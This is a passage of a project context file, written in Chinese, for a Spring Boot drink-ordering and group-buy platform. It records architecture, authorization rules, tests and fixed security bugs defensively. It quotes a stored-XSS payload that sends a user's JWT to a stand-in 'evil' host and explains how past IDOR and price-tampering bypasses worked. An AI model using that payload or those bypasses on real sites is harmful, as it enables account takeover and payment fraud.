# JoinDrink — Project Context for Claude

## 專案概述

**JoinDrink** 是一個多租戶飲料訂購與揪團平台，支援個人訂單（SOLO）和揪團訂單（GROUP）。
語言：繁體中文介面，後端使用英文程式碼。

## Tech Stack

| 層次 | 技術 |
|------|------|
| 語言 | Java 17 |
| 後端框架 | Spring Boot 3.4.3 |
| ORM | Spring Data JPA / Hibernate |
| 安全性 | Spring Security 6 + JWT (JJWT 0.11.5, HS512, 24h expiry) |
| 社群登入 | Firebase Admin SDK 9.4.2 (Google, Facebook, Phone) |
| 資料庫 | MySQL 8（本機 Docker，`docker-compose.yml`）|
| 快取 / 鎖 | Redis 7（本機 Docker）— 揪團購物車、分散式鎖、每日轉盤狀態 |
| 即時推播 | WebSocket/STOMP（`/ws-cart`, SockJS）|
| 圖片上傳 | Cloudinary v1.36.0（無憑證時自動改存本機 `uploads/`）|
| 圖片生成 | Java 2D (優惠券動態圖片生成) |
| API 文件 | SpringDoc OpenAPI / Swagger UI v2.8.5 |
| 建置工具 | Maven（**注意：repo 內沒有 `mvnw` 腳本，請用系統 `mvn`**）|
| 容器 | Dockerfile（多階段：`maven:3.9-eclipse-temurin-17` → `eclipse-temurin:17-jre`，非 root 執行）；CI 只建置、不推送 |
| 其他 | Lombok, JUnit 5 + Mockito（**沒有 TestNG**）, JaCoCo 0.8.12（僅產生報告，無覆蓋率門檻）, Spring Boot Actuator（僅 `/actuator/health`）|
| 前端 | Vanilla JavaScript + Tailwind CSS (無框架) |
| 前端 HTTP | Fetch API + Bearer JWT from localStorage |

## 專案結構

```
join_drink/
├── src/main/java/com/example/demo/
│   ├── controller/          # 14 REST controllers
│   ├── service/             # 31 個頂層類別（另有 order/、wallet/ 子套件共 7 個）
│   ├── entity/              # 26 JPA entities + 6 EmbeddedId 類別
│   ├── repository/          # 28 JPA repositories
│   ├── dto/                 # 25 Data Transfer Objects
│   ├── common/              # JWT、SecurityHeadersFilter、RequestIdFilter、SafeImageUrl／SafeText、GeoBounds、Cloudinary／Firebase／Swagger／WebConfig、DataSeeder、DemoDataSeeder
│   ├── config/              # RedisConfig、WebSocketConfig（掛載 StompAuthInterceptor）、StompSubscribeRules、TimeZoneConfig
│   ├── exception/           # CustomException + GlobalExceptionHandler
│   ├── DemoApplication.java # Spring Boot 入口
│   └── SecurityConfig.java  # 安全設定
├── src/main/resources/
│   ├── application.yml      # 主設定檔（僅 ${ENV_VAR:預設值}，無明文密鑰）
│   ├── application-local.yml.example # 本機設定範本
│   ├── application-local.yml # 本機設定 (git ignored)
│   └── serviceAccountKey.json # Firebase (git ignored)
├── frontend/
│   ├── Customer/            # 顧客前台（auth/ 8頁 + 主功能 12頁，共 20 HTML）
│   ├── Brand/               # 品牌總部管理後台（7 HTML）
│   └── store/               # 門市管理後台（12 HTML）
├── docker-compose.yml       # 本機 MySQL 8 + Redis 7
├── pom.xml
├── API.md                   # 完整 REST API 端點文件
├── DATABASE.md              # 26 張表 schema 說明
└── README.md                # 本機開發指南（中文）
```

> ⚠️ schema 的**唯一事實來源**是 `entity/` 下的 JPA Entity（`ddl-auto: update` 自動建表）。
> `DATABASE.md` 是對照說明文件，改 Entity 後請一併更新。

## 核心 Controllers（14 個）

| Controller | 職責 |
|-----------|------|
| `UserController` | 顧客認證、個人資料、優惠券、訂單、錢包、轉盤、常用地址 |
| `GroupOrderController` | 揪團訂單建立、加入、提交（V1 + V2）|
| `OrderController` | 訂單 V2 API（卡片列表、狀態更新、取消）|
| `BrandController` | 品牌認證、分類/商品管理、門市建立、規格配料、Dashboard、財務、口碑 |
| `BrandSpecOrderController` | 品牌規格拖曳排序 |
| `StoreController` | 門市認證、庫存管理、訂單處理、Dashboard、財務報表 |
| `CartController` | 購物車操作 |
| `PublicController` | 首頁、附近門市、搜尋、品牌、商品（公開不需登入）|
| `LocationController` | 地址搜尋、縣市區域選單 |
| `CouponController` | 優惠券查詢（舊版）|
| `DailySpinController` | 每日轉盤（spin、spin-status、game-wheel/brands、game-wheel/menu）|
| `ProductController` | 飲品 V2 API（分店飲品列表、客製化 V2、規格）|
| `UploadController` | 本地檔案上傳 |
| `UserFavoriteController` | 收藏店家（查詢、切換）|

> ⚠️ **本專案沒有 SSE**。舊版文件曾寫「SSE 端點直接寫在 GroupOrderController /
> StoreController / OrderController 內」，但全專案 `SseEmitter` 出現次數為 0，
> 別再去找那段不存在的程式碼。即時推播全部由 WebSocket/STOMP 實作：
> 推播來源是 `messagingTemplate.convertAndSend()`，目的地為
> `/topic/order/{orderId}`（訂單狀態）與 `/topic/group/{token}`（揪團品項異動）。

## 角色與權限

- `ROLE_CUSTOMER` — 一般顧客
- `ROLE_BRAND` — 品牌總部管理員
- `ROLE_STORE` — 門市管理員

## 授權規則（SecurityConfig）

`/api/stores/**` 這一段的 **matcher 順序有意義**，改動前務必讀完註解：

1. 公開讀取端點逐一列舉（`map`、`nearby`、`search`、`*/info`、`*/v2`、`brand/**`）
2. `GET /api/stores/{storeId:[0-9]+}` — 分店公開資訊，限定數字避免誤放行 `/api/stores/orders`
3. `/api/stores/**` → `hasAuthority("STORE")` 兜底，涵蓋所有寫入端點

⚠️ `requestMatchers(String...)` **不分 HTTP method**。曾因為 `"/api/stores/*"` 整段
permitAll，導致 `PUT /api/stores/update` 對外開放且可竄改任意分店（IDOR）。
新增分店端點時請確認它落在第 3 條規則裡。

同樣的錯誤也發生過在 `/api/products/**` 與 `/api/brands/**`：整段 permitAll 使得
`POST /api/products`（直接 `save()` 原始 entity）**未登入即可新增商品**，且 `save()`
具 merge 語意，帶入既有 `id` 就能竄改他人商品售價。現已改為只放行 `HttpMethod.GET`
的具體路徑，寫入端點一律落到 `authenticated()`。

**新增任何 permitAll 路徑時，一律指定 `HttpMethod.GET`，不要用整段萬用字元。**

### 身分一律取自 token，不可取自請求參數

顧客端點的使用者身分**只能**用 `JwtAuthenticationFilter` 寫入的 request attribute：

```java
@RequestAttribute(value = "currentUserId", required = false) Long currentUserId
```

`/api/users/{userId}/**` 這類帶路徑 id 的端點，進入方法後第一件事是呼叫
`UserController.requireSelf(userId, currentUserId)`，不符即擲出 403。

⚠️ 舊版寫成 `@RequestParam(required = false) Long authUserId` 再比對
`if (authUserId != null && ...)`，但那個值是**用戶端自己送的**——攻擊者只要不帶這個
參數，檢查就整段跳過。實測任一登入顧客即可讀寫他人個資、地址與錢包餘額。
全專案已無 `authUserId`，新增端點請勿再引入同類寫法。

同一個錯誤後來在 `OrderController` 又發現一次（S-6），而且更嚴重，兩種型態：

1. **路徑參數當身分用** — `GET /api/orders/user/{userId}/cards|active|recent-cards`
   直接拿路徑上的 `userId` 去查，完全沒有比對。實測任一登入顧客可讀他人完整訂單歷史，
   包含金額、品項與揪團的 `shareToken`（拿到就能看／加入該團）。
2. **`if (userId != null) 檢查 else 放行`** — `PUT /api/orders/{orderId}/status` 與
   `/cancel/v2` 的 else 分支註解寫著「Merchant/System level update」，但門市根本走不到
   這條路徑（`/api/orders/**` 是 CUSTOMER-only）。實測**不帶 `userId` 參數**即可把
   他人訂單從 READY 改成 COMPLETED。

`OrderController` 現有 `requireSelf()` 與 `requireOwnedOrder()` 兩個私有方法，
新增端點請一律先呼叫其一。查詢參數的 `userId` 只為相容舊前端而保留，**一律不採信**。

另外刪掉了 `GET /api/orders/store/{storeId}`：它是門市視角的列表卻掛在 CUSTOMER-only
路徑下，門市呼叫不到，反而讓顧客能撈出整間門市的訂單 entity（含他人外送地址）。
門市看訂單一律用 `GET /api/stores/orders`。

同一個錯誤在 `POST /api/orders/checkout`（顧客結帳頁真正打的端點）又出現一次，而且是
**兩個問題疊在一起**：

1. **身分取自 request body** — `orderService.createOrder(request.getUserId(), ...)`。
   實測攻擊者（餘額 0）把 `userId` 換成別人的，訂單建立成功且**受害者餘額 19255 → 19220**，
   攻擊者一毛沒付。順帶一提 `saveOrUpdateUserAddress` 也吃同一個值，可以把地址寫進他人帳號。
2. **成交價取自 request body** — `totalAmount` 與 `item.finalPrice` 直接拿去扣款。
   實測帶 `finalPrice: 1`，**$35 的飲料只扣了 $1**。

現在身分一律 `currentUserId`，金額一律由 `OrderService.repriceItems()` 依資料庫重算。
`AuthorizationTest` 的 S-7 兩支守住這兩條（已驗證：改回舊寫法時兩支都轉紅）。

### ⚠️ 售價只能由伺服器算，公式在 `PricingService`

成交價 = `basePrice` ＋ 區域加價（`brand_region_category_pricing`）＋ 配料加價。
這條公式原本只寫在 `CartService.addItem` 裡，結帳端點完全沒有重算，才會出現上面的 $1 事件。

**任何會產生金額的地方都必須呼叫 `PricingService`，不要在 Service 內再寫一份**——
少算區域加價會讓區域定價失效，少算配料加價就是直接漏收錢。
`unitPriceSnapshot` / `finalPrice` / `productNameSnapshot` 這些「快照」欄位的值
一律由伺服器在成交當下決定，用戶端送什麼都會被覆蓋掉。

⚠️ 訂單編號 `generateOrderNo()` 的隨機碼原本只有 4 個十六進位字元＝65,536 種，
同一天累積 300 張單時撞號機率已接近 50%（`orders.order_no` 有唯一索引，撞到就是 500）。
已改為 10 個字元，不要改回去。

## 測試

`mvn test`（需先 `docker compose up -d`，測試會連本機 MySQL 與 Redis）。

**目前規模（2026-10-13，以 `grep -rhE '^\s*@Test\b' src/test/java | wc -l` 計算）：217 個 `@Test`，分布在 42 個測試類別。** 指令一定要有 `\b`：不加的話，`ImageStorageServiceTest` 第 30 行的 `@TestPropertySource` 也會被算進來，變成 218。新增或刪除測試時，請同步更新此表與這段數字。CI 的「測試總計與略過檢查」步驟會把 Surefire 的測試數印成 annotation（2026-10-13 的 run 38352055664 為 217，與這裡一致）；略過的測試會讓該步驟失敗。

| 區域 | 測試（數量） | 守住的東西 |
|------|-------------|-----------|
| 授權與路由 | `AuthorizationTest`（19） | 未認證商品寫入、跨帳號讀寫個資／錢包／訂單、偽造參數與「不帶參數」兩種繞過、拿他人 userId 結帳、竄改 finalPrice、跨帳號讀寫收藏、消耗他人優惠券、debug 與門市傾印端點已移除 |
| 授權與路由 | `AuthorizationRouteInventoryTest`（3） | 列舉全部路由：非公開路由匿名呼叫必須回 401／403；公開清單的每一條都必須真的存在（ADR-0003） |
| 授權與路由 | `GroupOrderSecurityTest`（5） | 揪團 H-1～H-3：伺服器重算價格與歸屬；他人的 couponId 被拒；非團長不可改他人揪團狀態；團長本人的截單與重開可行，亂打的狀態被白名單擋下 |
| 授權與路由 | `GroupOrderServiceAuthorizationTest`（6） | 揪團讀取與加入：只有發起人能取得分享 token；非成員不可讀數字 id 的明細；舊版加入必須帶正確的 token；拒絕他品牌的商品與門市停售的商品 |
| 授權與路由 | `StompSubscribeRulesTest`（9） | WebSocket 訂閱授權的純規則：顧客只能訂閱自己參與的訂單與揪團；門市只能訂閱自己的頻道；角色必須相符（id 會撞號）；未知目的地與超大數字 id 一律拒絕 |
| 授權與路由 | `StompAuthInterceptorTest`（13） | WebSocket 認證與訂閱授權，走真實的通道與真實的 JWT（只 mock 資料庫）：缺標頭、非 Bearer、偽造、過期、亂碼的 token 一律拒絕；發起人與參與者可訂閱訂單；非參與者與同 id 的門市不可訂閱；門市只能訂閱自己的頻道；揪團頻道只開放顧客 |
| 授權與路由 | `WebSocketWiringTest`（1） | 攔截器確實掛在 `clientInboundChannel` 上（載入 Spring context） |
| 授權與路由 | `JwtAuthenticationFilterTest`（7） | JWT 過濾器：已刪除或不存在的帳號 token 被拒；有效的顧客、品牌、門市 token 通過；未知角色被拒 |
| 帳號與登入 | `AuthServiceSecurityTest`（7） | 帳號安全：mock Firebase token 只在 mock 模式可用；已刪除帳號不可經社群登入；手機證明不可與他人的社群 UID 併用；合併帳號時拒絕其他號碼的 token；社群 provider 不符時在設定密碼前拒絕 |
| 帳號與登入 | `SocialSignupRulesTest`（6） | 社群登入的帳號狀態決策：已綁定、手機衝突、建立新帳號；不變量：手機已被使用就絕不另建帳號 |
| 帳號與登入 | `AuthServiceSmsModeGuardTest`（6） | prod profile 下 `sms.mode` 不是 firebase 就拒絕（含 `MOCK_TOKEN` 分支） |
| 帳號與登入 | `JwtUtilsProdGuardTest`（4） | JWT 密鑰：dev 可用預設值；prod 拒絕預設值與空白密鑰；prod 接受隨機密鑰 |
| 帳號與登入 | `DemoDataSeederProdGuardTest`（2） | prod profile 不植入示範帳號，即使 `DEMO_DATA_ENABLED=true` |
| 帳號與登入 | `LoginAttemptLimiterTest`（10） | 登入／OTP 固定視窗限流（ADR-0004）；偽造的 `X-Forwarded-For` 不改變識別；Redis 不可用時退回本地計數；Redis 拋例外時仍以本地計數擋下第三次 |
| 金流與併發 | `WalletConcurrencyTest`（3） | 併發儲值不可短少、帳本與餘額必須相符、併發扣款不可透支、列鎖不被一級快取架空 |
| 金流與併發 | `GroupCheckoutConcurrencyTest`（6） | 揪團四條金流路徑重複觸發時只能發生一次；同一張券不可用兩次 |
| 金流與併發 | `RatingConcurrencyTest`（2） | 併發評分不得死鎖、門市則數與平均分數要對得起來 |
| 金流與併發 | `IdempotencyServiceTest`（9） | 結帳冪等（ADR-0005）：格式檢查、重送回放、進行中衝突、失敗與例外釋放、使用者之間互不影響；Redis 與本地兩條路徑 |
| 金流與併發 | `ExclusiveJobRunnerTest`（3） | 排程互斥（ADR-0006）：他人持鎖時略過；取得鎖時執行並以同一 token 釋放；任務拋出例外仍釋放 |
| 金流與併發 | `TxDisplayTest`（7） | 帳本種類正規化：舊的「標題\n說明」格式要能拆回兩欄、補款靠正負號分辨收付方 |
| 訂單規則 | `ItemSpecResolverTest`（7） | 固定規格防竄改（見下方「品項規則抽在 service/order/」） |
| 訂單規則 | `ItemHashTest`（6） | 品項識別碼：配料順序不影響合併、套券的那杯要拆開 |
| 訂單規則 | `CouponEligibilityTest`（6） | 優惠券適用範圍、已付款不可套券 |
| 訂單規則 | `MemberCancelSettlementTest`（9） | 團員取消品項的退款規則：只有真的付過（PAID／ESCROWED）才會退，且以 `escrowAmount` 為上限 |
| 訂單規則 | `OrderStatusGuardTest`（5） | 顧客端狀態轉換白名單（`OPEN\|SUBMITTED → CANCELLED`、`SUBMITTED → PAID`） |
| 訂單規則 | `CancellableStatusTest`（2） | 揪團品項可否取消：只有 OPEN、SUBMITTED（大小寫與空白不敏感） |
| 訂單規則 | `PricingServiceTest`（5） | 定價：規格與加料取用伺服器價格；拒絕未設定的規格與加料；加料數量上限與重複選取 |
| 訂單規則 | `QuantityLimitsTest`（1） | 數量只接受範圍內的整數 |
| 訂單規則 | `CartServiceTest`（1） | 購物車小計 = 單價 × 數量 |
| 訂單規則 | `RedisCartServiceTest`（2） | Redis 購物車的快照不含 LAZY 欄位；品項的 product 為 null 也能存 |
| 訂單規則 | `BrandServiceReferenceTest`（2） | 品牌參照：拒絕引用他品牌的分類、規格與加料 id |
| 訂單規則 | `OrderNoFormatTest`（2） | 訂單編號格式為 ORD＋MMdd＋10 位十六進位；同一天 300 張單不重複 |
| 輸入與輸出安全 | `SafeImageUrlTest`（7） | 圖片網址白名單：擋 `x" onerror=…`、`javascript:`、`../`、控制字元 |
| 輸入與輸出安全 | `SafeTextTest`（6） | 會顯示給他人看的名稱：拒絕 `< > " \`` 與控制字元、上限 30 字；第三方登入名稱只清理、不拒絕 |
| 輸入與輸出安全 | `UploadControllerTest`（4） | 通用圖片上傳以檔案內容（magic bytes）判斷，副檔名改成 .png 的 HTML 被拒；副檔名白名單；5 MB 上限；內容為 PNG 時成功並交給儲存服務 |
| 其他 | `GeoBoundsTest`（5） | 附近店家的矩形預篩必為 50 km 圓的超集（取樣驗證） |
| 其他 | `RequestIdFilterTest`（5） | `X-Request-Id` 的沿用與替換規則；請求結束後 MDC 清空 |
| 其他 | `ImageStorageServiceTest`（4） | 無 Cloudinary 憑證時改走本機儲存、同 publicId 覆寫、可疑副檔名正規化 |
| 其他 | `BrandSummaryJsonTest`（2） | 品牌清單的 JSON 欄位名稱（`brandId`、`brandName`、`logoUrl`）是前端的契約 |
| 其他 | `PageSizeClampTest`（6） | 列表分頁夾制：門市訂單、附近店家、錢包帳本的 page／size 都有上下限；page 為 0 或負數時視為第一頁 |
| 其他 | `TimeZoneConfigTest`（1） | 啟動時的時區設定：先切到 UTC（免得主機本來就是 Asia/Taipei 而假性通過），再確認 `applyDefaultTimeZone()` 把 JVM 預設時區設為 Asia/Taipei，不經過 `main()` |
| 應用程式 | `DemoApplicationTests`（1） | Spring context 能否載入 |

除了上表中載入 Spring context 的 9 個類別（`DemoApplicationTests`、`AuthorizationTest`、`AuthorizationRouteInventoryTest`、`GroupOrderSecurityTest`、`GroupCheckoutConcurrencyTest`、`RatingConcurrencyTest`、`WalletConcurrencyTest`、`ImageStorageServiceTest`、`WebSocketWiringTest`）之外，其餘 33 個類別不載入 Spring context，是純邏輯或 Mockito 測試。
新增純規則時請放在 `service/order/`、`service/wallet/`、`common/` 這類目錄，不要為了測一條規則去啟整個 context。

> 以上既有測試都已驗證「把修補改回舊寫法時會失敗」——`AuthorizationTest` 在還原 IDOR 時 3 個、還原 S-6 時 2 個轉紅，`WalletConcurrencyTest` 改回 `findById` 時 2 個轉紅，`ItemSpecResolverTest` 把防竄改改回「照單全收」時 4 個轉紅，`GroupCheckoutConcurrencyTest` 拿掉品項列鎖或結帳狀態守衛時各 1 個轉紅。
> 新增測試時請照做，在修補前後各跑一次，確認它真的抓得到回歸，否則只是裝飾。
> 2026-10-12 與本輪新增的測試（`IdempotencyServiceTest`、`ExclusiveJobRunnerTest`、`GeoBoundsTest`、`RequestIdFilterTest`、`AuthorizationRouteInventoryTest`、`BrandSummaryJsonTest`、`StompAuthInterceptorTest`、`WebSocketWiringTest`、`PageSizeClampTest`、`UploadControllerTest`、`OrderNoFormatTest`、`TimeZoneConfigTest`，以及 `LoginAttemptLimiterTest` 的新增案例）已於 2026-10-13 做過還原驗證：共 39 組故意破壞（把修補改回舊寫法，或改壞規則），每一組都讓至少一支對應的測試轉紅，對照表見 README「還原驗證」。這些類別並非每個測試都被破壞過：GeoBoundsTest、RequestIdFilterTest、AuthorizationRouteInventoryTest 各有未破壞的案例，LoginAttemptLimiterTest 只破壞了新增的 2 個案例，確切範圍以 README 為準。同一次 CI 內若同時破壞會互相遮蔽的兩處，必須單獨再跑一次，否則看不出各自是否被抓到。破壞用的 commit 標題以 `scratch:` 開頭，只存在於暫存分支 `main-cbduag`（可刪除），不屬於 PR 分支。

### 另外兩層驗證（都在 CI 上跑）

`mvn test` 抓不到「服務跑起來才會現形」的問題，所以還有：

```bash
cd scripts && npm install
node e2e-verify.js      # API 端對端，12 個面向（逐項通過數由腳本輸出）
node ui/run-all.js      # 39 個 HTML 頁普掃（51 次載入）+ 點餐／轉盤／揪團三條主線（Playwright）
```

`.github/workflows/ci.yml` 會依序跑完這三層。**改完動到序列化、交易邊界或前端流程的
程式碼後，請至少跑一次第二三層**——九次 `LazyInitializationException` 裡有兩次
（下單完成頁、揪團成員清單）是單獨 curl 端點會過、實際走流程才炸的。

## ⚠️ 使用者可控字串：寫入端白名單、輸出端轉義

`stores.store_name` / `cover_url`、商品 `logo_url`、`users.name`、品項／訂單備註都是店家或顧客
自己寫進去的資料，而前端大量用 `innerHTML` 拼字串。這條路徑曾完全沒有防護：任何 BRAND 帳號
（`POST /api/brand-auth/register` 是公開端點，不需驗證）把封面設成
`x" onerror="fetch('https://evil/?t='+localStorage.getItem('token'))`，就能在每一位訪客的首頁
執行它（JWT 就放在 `localStorage`）；顧客把名字改成 `<img src=x onerror=…>` 也能對門市後台做同樣的事
（2026-10-11 複審的 X-1／X-2，已修）。

- **寫入端**：圖片網址一律過 `common/SafeImageUrl.normalize()`——只允許 `http(s)://` 或單層
  `/…` 站內路徑，含 `"`、`'`、`<`、`>`、空白或控制字元一律 400。接到門市封面、品牌 logo、
  商品 logo、會員頭像四個寫入點；新增 `*Url` 欄位時請照做。
- **輸出端**：每個頁面／每支 store JS 都有自己的區域 `escapeHtml`（沿用 `Brand/js/hq-menu-api.js`
  的實作，不新增共用模組以免動到離線載入順序）。任何插進 HTML 的值都要先過它，包含屬性值。
- **不要**把資料拼進 `onclick="fn('…')"` 這種 JS 字串：只換單引號擋不住結尾是反斜線的字串，
  同一層還是 HTML。改用 `addEventListener` 或 `data-*` + 事件代理傳值。
- **inline script 要另驗語法**：`node scripts/ui/check-inline-scripts.js [file.html…]`（不帶參數
  就掃 `frontend/` 下所有 HTML）；`node --check` 只看得到獨立 `.js`，看不到寫在 HTML 裡的程式碼。
- **防禦的另一層**：`SecurityConfig` 現在有 `X-Content-Type-Options`/`frame-ancestors 'none'`/
  `Referrer-Policy`/`Permissions-Policy`/HSTS，CSP 由 `app.security.csp.enabled`（**預設 false**）
  與 `app.security.csp.policy` 控制，由 `common/SecurityHeadersFilter` 加上；要真的收緊
  `script-src` 得先把 inline event handler 外部化，否則只能整頁破相。

其他本輪一起補的防呆：登入／OTP 端點走 `service/LoginAttemptLimiter`（`check(scope, identity)`，
Redis 不可用時退回本地計數，預設 10 次／300 秒，超過回 429）；prod profile 下 `sms.mode` 非 `firebase`
直接拒絕啟動，`MOCK_TOKEN` 只在非 prod 生效，`DemoDataSeeder` 在 prod 一律不植入
（比照 `JwtUtils.assertProductionSecret`）；`PUT /api/stores/status` 只接受 `active` / `closed`。

## 資料庫（26 張表）

重要表格：
- `brands`, `stores` — 品牌與門市帳號
- `users`, `user_auth_providers` — 顧客帳號與社群綁定
- `user_addresses` — 使用者常用地址（多筆，支援預設）
- `product_templates` — 飲品模板（品牌層級）
- `product_categories` — 分類（Entity: `MenuCategory`）
- `spec_master`, `brand_spec_setting` — 規格設定（甜度/冰量/大小）
- `topping_master`, `brand_topping_setting` — 加料設定
- `orders`, `order_items`, `order_item_toppings` — 訂單系統（`orders` Entity: `GroupOrder`）
- `user_coupons` — 優惠券系統（轉盤抽獎，直接記錄品牌+飲品）
- `order_ratings` — 訂單星級評分（`order_reviews` 已移除）
- `transaction_records` — 錢包帳本（TOPUP/ESCROW/REFUND/FINAL_PAY/REPAYMENT）
- `cart_items` — 購物車（有門市限制，含 qty 欄位）
- `user_favorites` — 收藏店家

完整 schema 請見 `DATABASE.md`。

## 訂單狀態流程

```
OPEN → SUBMITTED → PREPARING → READY → COMPLETED
  └────────┴───────────┴→ REJECTED（分店拒絕）
  ↘ CANCELLED（顧客取消）
```

⚠️ **`PREPARING` 是實際存在的狀態**（`AnalyticsService.acceptOrder` 設定，寫入 `preparing_at`），
舊版文件漏列。`completeProduction` 只接受 PREPARING → READY，`acceptOrder` 可從 OPEN 或
SUBMITTED 進入 PREPARING。

揪團流程：揪團主建立 → 產生 token → 其他人用 token 加入 → 揪團主統一提交

### 揪團退款與可見性（團長 2026-10-13 定案）

判斷與退款去向集中在 `service/order/GroupRefundPolicy`（純函式，有單元測試）；`GroupOrderService` 只負責接上資料庫與列鎖。

- **送單前（OPEN）**：團員已結帳的品項可自行取消並退款，退回該品項**當下的付款方式**。錢包付款退回錢包；現金、信用卡不經錢包、不入帳。品項在送單前已取消，因此無後續收款與對帳。
- **送單後（SUBMITTED）**：團員不可自行取消或退款，一律由團長操作，退款**入團長帳號**。團長整單取消時，送單後已付的金額同樣入團長帳號。
- **截單（LOCKED）**：團員不可自行取消品項，由團長處理。團長定案未明載此狀態，這是暫定解讀，見 `GroupRefundPolicy.memberMaySelfCancel`。
- **團內資料僅供成員檢視**：成員 = 團長，或已在團內有品項的團員。非成員（含未登入）持分享連結只拿到店家、狀態、建立時間等基本欄位（`getGroupOrderDTOByToken` 的 `outsiderView`；不含品項、地址、備註、金額、團長與分享 token），須先加入揪團才能看到團內資料。
- **已知缺口**：`/topic/group/{token}` 的推播目前對持 token 的已登入顧客開放。事件內容是品項 id、成員 userId 與狀態（不含姓名與金額）。依上述規則應收斂到成員，尚未實作，因為前端需要同時改成「成員確認後才訂閱」。

⚠️ **顧客只能走 `service/order/OrderStatusGuard` 允許的轉換**（`OPEN\|SUBMITTED → CANCELLED`、
`SUBMITTED → PAID`，後者是舊前端「已付款」通知）。`OrderController` 的狀態端點原本只驗
「是不是發起人」就 `setStatus`，任何登入者都能把訂單直接改成 `COMPLETED`（拿去評分）、
把已結帳的 `SUBMITTED` 改回 `OPEN`（重新開放加點再結一次）或偽造付款狀態。
門市端的 `acceptOrder` / `completeProduction` / `finalizeOrder` 本來就有各自的守衛，不要動。

## 錢包/支付邏輯

帳本 `transaction_records` 的 `type` 只放 token，人看的字放 `description`
（常數在 `service/wallet/TxType`）：

- `TOPUP` 儲值 ／ `PAYMENT` 下單扣款 ／ `ESCROW` 團長代墊託管款
- `REFUND` 取消或拒單退款 ／ `REPAYMENT` 團員付出 ／ `REPAYMENT_RECEIVED` 團長收取
- 支付方式：`WALLET`（餘額）或 `CASH`

⚠️ `type` 一度被當成顯示字串，實際存 `"消費扣款\n個人訂單 #12 結帳扣款"`，
前端再自己 split、用 `includes('補款')` 猜種類。**讀取一律經 `TxDisplay.normalize()`**
（純函式，會把舊格式拆回 type／description 並給出中文 label），不要直接信 `type` 原始值，
也不要在前端再寫一份判斷。舊資料還在庫裡，改判斷邏輯時 `TxDisplayTest`（7 個）會擋著。

⚠️ 錢包帳本 `GET /api/wallet/transactions` **必須分頁**（`UserProfileService.MAX_PAGE_SIZE = 100`）。
原本是把整份帳本撈進記憶體再 `subList` 切頁——查十筆卻讀了全部，
和 `/api/stores/orders` 當初那個問題一模一樣。

⚠️ 扣款要**先存訂單再扣款**。原本順序相反，帳本說明寫 `"個人訂單 #" + order.getId()`
而訂單還沒 persist，`getId()` 必為 null，正式資料庫裡 52 筆全長成「個人訂單 # 結帳扣款」。

### ⚠️ 餘額異動必須鎖列

所有金流都經由 `TransactionRecordService.updateStoreCredit()`（GroupOrderService 有 10 處
呼叫）與 `UserProfileService.topUp()`，兩者都必須用
`UserRepository.findByIdForUpdate()`（`SELECT ... FOR UPDATE`），**不可改回 `findById`**。

餘額是「讀出 → 相加 → 寫回」，沒有列鎖時併發請求會互相覆蓋。實測 20 個併發各儲值 10 元，
最終只入帳 70 元，且 `transaction_records` 總額（120）與 `users.balance`（70）對不起來——
對含金流的系統代表無法對帳。

`WalletConcurrencyTest` 會擋住這個回歸（已驗證：改回 `findById` 時兩個測試都會失敗）。
新增任何動到 `balance` 的流程時，一律走上述兩個方法，不要自己讀寫餘額。

### ⚠️ 列鎖會被一級快取架空，必須在持鎖狀態下重讀

`updateStoreCredit` 裡 `findByIdForUpdate` 之後那行
`entityManager.refresh(user, PESSIMISTIC_WRITE)` **不可刪**。

呼叫端若在扣款前已經讀過同一個 `User`（揪團結帳會先碰 `item.getUser()`），
該 entity 已在 persistence context 裡，此時 `findByIdForUpdate` 雖然確實取得列鎖，
Hibernate 仍回傳快取中那個「上鎖之前」的實例——餘額是舊值，
併發時每個交易都用同一個舊餘額計算，最後一個寫入獲勝。

**不能只用 `entityManager.refresh(user)`**：MySQL 預設 REPEATABLE READ 之下，
普通 SELECT 讀的是交易快照（快照在本交易第一次讀取時就固定），refresh 回來還是舊值；
只有鎖定讀會看到最新已提交版本，所以必須指定 `PESSIMISTIC_WRITE`。
（這一版修補是被 `WalletConcurrencyTest` 打回來才改對的。）

### ⚠️ 「檢查狀態 → 扣款 → 改狀態」一定要先鎖列

金流流程都是 read-modify-write，沒有列鎖時併發請求會重複扣款：

| 流程 | 必須用的查詢 | 未修補前實測（都應只發生一次 $35）|
|------|-------------|------------------|
| 團員結帳 `getMemberUnpaidTotalAndMarkPaid` | `OrderItemRepository.findByGroupOrderAndUserAndStatusForUpdate` | 帳本 −175、餘額只掉 35 |
| 團長結帳 `checkout` | `GroupOrderRepository.findByShareTokenForUpdate` ＋狀態守衛 | 8 個併發全部成功、扣 8 次 |
| 補款 `repayToHost` | 同團員結帳（狀態帶 UNPAID/ESCROWED）| 扣了 175 |
| 取消退款 `handleGroupOrderCancellation` | `GroupOrderRepository.findByIdForUpdate` ＋ `findByGroupOrderIdForUpdate` | escrow 退了 280 |

`GroupCheckoutConcurrencyTest`（6）守住這四條。

### ⚠️ 評分彙總：先鎖門市列，且彙總要用單一 SQL

`stores.avg_rating` / `review_count` 是反正規化欄位。寫評分的順序**必須**是
「先 `StoreRepository.findByIdForUpdate` 取排他鎖 → 再 insert `order_ratings`」。

反過來的話：insert 會因為外鍵在 `stores` 那列加共享鎖，隨後的 update 要升級成排他鎖，
兩個併發交易互相等待——實測 12 個併發評分只有 2 筆成功，10 筆死鎖。

彙總本身也**不可以**在 Java 端 `countByStoreId` 之後 `setReviewCount` 再 save：
REPEATABLE READ 之下那個 COUNT 讀的是本交易快照，看不到別人剛提交的評分，
每個交易都用自己的舊數字覆蓋回去（實測 12 筆評分只算出 4 筆）。
改用 `StoreRepository.refreshRatingAggregate` 的單一 `UPDATE ... (SELECT COUNT/AVG ...)`，
子查詢讀的是最新已提交版本。`RatingConcurrencyTest`（2）守住這兩條。

### ⚠️ 優惠券的消耗要原子

`applyCouponToItem` 必須用 `UserCouponRepository.markUsedIfUnused()`
（`UPDATE ... WHERE status = 'unused'`，受影響列數 0 就代表已被用掉），
**不可改回 `markCouponAsUsed()` 那種先 findById 檢查再 save 的寫法**——
那是 read-check-write，實測兩個品項同時套同一張券時兩邊都會過、一張券折了兩次。
而且要在動品項**之前**先消耗，輸的那一方才不會已經改了資料才發現券沒了。

⚠️ 擋住重複退款的是**列鎖**，不是狀態守衛。實測只拿掉取消流程的列鎖、留著
「已取消就 return」的守衛，escrow 仍退了 140——沒有鎖時讀到的狀態本身就是舊的。
狀態守衛是第二層保險，不要把它當成防線。

## ⚠️ `open-in-view: false`：交易外不可碰 LAZY 關聯

`application.yml` 設 `spring.jpa.open-in-view: false`，**請保持關閉**（開著會讓 session
撐到 view 渲染完，掩蓋 N+1 並長時間佔用連線）。代價是：Service 方法回傳後 session 就關了，
